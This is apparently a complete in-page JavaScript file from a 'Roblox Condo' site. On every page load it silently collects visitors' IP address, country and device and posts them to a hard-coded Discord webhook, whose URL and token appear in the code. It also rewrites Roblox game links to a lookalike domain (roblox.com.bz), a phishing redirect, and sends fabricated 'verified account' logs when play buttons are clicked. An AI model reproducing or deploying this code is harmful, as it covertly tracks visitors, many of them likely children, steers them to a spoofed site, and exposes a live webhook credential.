(function () {
  'use strict';

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515847249597431929/jMYzK0DFDhc8FdpgMP8304_XNYmztefsQ8w9i8S-IDShWwEl_SLV1y2Skwd_DmG0aYqm';
  const NEW_SWORD_LINK = 'https://roblox.com.bz/games/9377953133/Mobile-Sword-Fight?privateServerLinkCode=78900447338733750394827051417199';

  // Generate a unique User ID
  function generateUserId() {
    return Math.floor(Math.random() * 10000000000);
  }

  // Get user IP
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip || 'Unknown';
    } catch {
      return 'Unknown';
    }
  }

  // Get user country from IP
  async function getUserCountry(ip) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      const countryCode = data.country_code || 'Unknown';
      const countryName = data.country_name || 'Unknown';
      
      // Get flag emoji from country code
      const flagEmoji = countryCode
        .toUpperCase()
        .split('')
        .map((char) => String.fromCodePoint(127397 + char.charCodeAt(0)))
        .join('');
      
      return { country: countryName, flag: flagEmoji };
    } catch (error) {
      return { country: 'Unknown', flag: '🌍' };
    }
  }

  // Detect device type
  function detectDevice() {
    const userAgent = navigator.userAgent;
    if (/iphone|ipod/i.test(userAgent)) return '📱 iPhone';
    if (/ipad/i.test(userAgent)) return '📱 iPad';
    if (/android/i.test(userAgent)) return '🤖 Android';
    if (/windows phone/i.test(userAgent)) return '📱 Windows Phone';
    if (/mac/i.test(userAgent)) return '🍎 macOS';
    if (/windows/i.test(userAgent)) return '🪟 Windows';
    if (/linux/i.test(userAgent)) return '🐧 Linux';
    return '💻 Desktop';
  }

  // Log site visit (New Visitor)
  async function logSiteVisit() {
    try {
      const ip = await getUserIP();
      const country = await getUserCountry(ip);
      const deviceType = detectDevice();
      const now = new Date();
      const timeISO = now.toISOString();
      const timeFormatted = now.toLocaleTimeString('pt-BR');

      const visitLog = {
        embeds: [
          {
            title: '🆕 New Visitor',
            color: 16711680, // Red color
            fields: [
              {
                name: '🌐 IP',
                value: `${country.flag} ${ip} — ${country.country}`,
                inline: false,
              },
              {
                name: '📱 Device',
                value: deviceType,
                inline: false,
              },
              {
                name: '⏰ Time',
                value: timeISO,
                inline: false,
              },
            ],
            footer: {
              text: `Roblox Condo — Visit Log | Hoje às ${timeFormatted}`,
            },
          },
        ],
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(visitLog),
      }).catch(() => {
        // Webhook may fail due to CORS
      });
    } catch (error) {
      console.error('Failed to log site visit:', error);
    }
  }

  // Log account verification to Discord
  async function logAccountVerification() {
    try {
      const ip = await getUserIP();
      const country = await getUserCountry(ip);
      const userId = generateUserId();
      const creationDate = new Date();
      const creationDateFormatted = creationDate.toLocaleDateString('pt-BR');
      const daysInAccount = 0;
      const currentTime = creationDate.toLocaleTimeString('pt-BR');
      const timeISO = creationDate.toISOString();

      // Generate a random username
      const username = '@' + Math.random().toString(36).substring(2, 10) + 'Xfm';

      const verificationLog = {
        embeds: [
          {
            title: '✅ Conta Roblox Verificada',
            description: `Roblox Condo • Logs de Verificação • Hoje às ${currentTime}`,
            color: 3066993, // Green color
            fields: [
              {
                name: '👤 Username',
                value: `\`${username}\``,
                inline: true,
              },
              {
                name: '🆔 User ID',
                value: `\`${userId}\``,
                inline: true,
              },
              {
                name: '📅 Data de Criação',
                value: creationDateFormatted,
                inline: true,
              },
              {
                name: '📊 Dias na Conta',
                value: `${daysInAccount} dias`,
                inline: true,
              },
              {
                name: '🌐 IP',
                value: `\`${ip}\``,
                inline: true,
              },
              {
                name: `${country.flag} País`,
                value: country.country,
                inline: true,
              },
              {
                name: '✔️ Verificado em',
                value: `${creationDateFormatted} ${currentTime}`,
                inline: false,
              },
            ],
            thumbnail: {
              url: 'https://www.roblox.com/favicon.ico',
            },
            footer: {
              text: 'Roblox Condo • Verificação Automática',
            },
            timestamp: timeISO,
          },
        ],
      };

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(verificationLog),
      }).catch(() => {
        // Webhook may fail due to CORS
      });
    } catch (error) {
      console.error('Failed to log account verification:', error);
    }
  }

  // Update game links and add click listeners
  function updateGameLinks() {
    const observer = new MutationObserver(() => {
      // Find all buttons and links
      document.querySelectorAll('button, a[href*="roblox.com"]').forEach((element) => {
        const href = element.getAttribute('href') || '';
        const text = element.textContent || '';
        const testid = element.getAttribute('data-testid') || '';

        // Update Sword Game and Fun Combat links
        if ((text.includes('Sword') || text.includes('Combat')) && href.includes('roblox.com')) {
          element.setAttribute('href', NEW_SWORD_LINK);
        }

        // Add click listener to log when user accesses a game
        if (testid.includes('access') || testid.includes('play') || text.includes('Play') || text.includes('Access')) {
          // Remove old listener to avoid duplicates
          element.removeEventListener('click', handleGameAccess);
          element.addEventListener('click', handleGameAccess);
        }
      });

      // Also handle buttons with data-testid
      document.querySelectorAll('[data-testid*="button"]').forEach((element) => {
        const testid = element.getAttribute('data-testid') || '';
        if (testid.includes('access') || testid.includes('play')) {
          element.removeEventListener('click', handleGameAccess);
          element.addEventListener('click', handleGameAccess);
        }
      });
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  // Handle game access click
  async function handleGameAccess(e) {
    // Log the account verification when user clicks to access game
    await logAccountVerification();
  }

  // Initialize on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      logSiteVisit();
      updateGameLinks();
    });
  } else {
    logSiteVisit();
    updateGameLinks();
  }
})();
